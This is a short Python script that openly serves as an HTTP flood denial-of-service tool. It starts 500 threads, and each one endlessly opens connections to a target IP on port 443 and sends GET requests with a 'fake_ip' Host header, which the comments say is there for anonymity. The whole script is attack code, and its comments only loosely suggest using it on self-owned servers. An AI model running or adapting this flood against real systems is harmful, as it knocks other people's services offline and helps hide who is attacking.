import threading
import socket
#target is the ip of the server/preferably the self owned ones that we are going to test script this upon
target = 'x.x.x.x'
#we can launch a similar attack on port 80 etc.
port = 443
#fake_ip is to ensure anonimity and it can be anything
fake_ip = 'x.x.x.x'
under_attack = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        global under_attack
        under_attack += 1
        if under_attack%500 == 0:
            print(under_attack)
for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()
